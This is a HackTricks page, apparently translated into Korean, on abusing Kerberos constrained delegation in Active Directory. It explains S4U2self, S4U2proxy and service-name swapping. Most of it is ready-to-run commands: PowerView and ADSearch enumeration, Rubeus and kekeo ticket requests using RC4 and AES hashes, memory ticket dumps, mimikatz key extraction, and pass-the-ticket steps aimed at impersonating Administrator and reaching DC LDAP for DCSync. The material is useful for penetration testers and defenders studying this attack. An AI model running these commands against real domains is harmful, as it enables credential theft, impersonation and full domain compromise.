# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

이를 사용하면 도메인 관리자가 **사용자 또는 컴퓨터를 가장**하여 어떤 **서비스**에 대해서도 컴퓨터를 **허용**할 수 있습니다.

- **자기 자신을 위한 서비스 (_S4U2self_):** 만약 **서비스 계정**의 _userAccountControl_ 값이 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)를 포함하고 있다면, 그 계정은 다른 사용자를 대신하여 자신(서비스)에 대한 TGS를 얻을 수 있습니다.
- **프록시를 위한 서비스 (_S4U2proxy_):** **서비스 계정**은 **msDS-AllowedToDelegateTo**에 설정된 서비스에 대해 어떤 사용자를 대신하여 TGS를 얻을 수 있습니다. 이를 위해 먼저 그 사용자로부터 자신에 대한 TGS가 필요하지만, S4U2self를 사용하여 그 TGS를 얻은 후 다른 TGS를 요청할 수 있습니다.

**참고**: 사용자가 AD에서 ‘_계정이 민감하며 위임할 수 없습니다_’로 표시된 경우, 그들을 **가장할 수 없습니다**.

이는 **서비스의 해시를 손상시키면** 사용자를 **가장하고** 그들의 이름으로 어떤 **서비스**에 대한 **접근**을 얻을 수 있다는 것을 의미합니다(가능한 **privesc**).

게다가, **사용자가 가장할 수 있는 서비스에만 접근할 수 있는 것이 아니라, 어떤 서비스에도 접근할 수 있습니다**. 왜냐하면 SPN(요청된 서비스 이름)이 확인되지 않기 때문입니다(티켓의 이 부분은 암호화/서명되지 않음). 따라서 **CIFS 서비스**에 접근할 수 있다면, 예를 들어 Rubeus에서 `/altservice` 플래그를 사용하여 **HOST 서비스**에도 접근할 수 있습니다.

또한, **DC에서의 LDAP 서비스 접근**은 **DCSync**를 악용하는 데 필요합니다.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- Step 1: **허용된 서비스의 TGT 가져오기**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 다른 방법으로 **TGT 티켓** 또는 **RC4** 또는 **AES256**을 얻을 수 있습니다. SYSTEM이 아니더라도 프린터 버그, 제약 없는 위임, NTLM 릴레이 및 Active Directory 인증서 서비스 남용과 같은 방법이 있습니다.
>
> **그 TGT 티켓(또는 해시)을 가지고 있으면 전체 컴퓨터를 손상시키지 않고도 이 공격을 수행할 수 있습니다.**

- Step2: **사용자를 가장하여 서비스에 대한 TGS 얻기**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**더 많은 정보는 ired.team에서 확인하세요.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
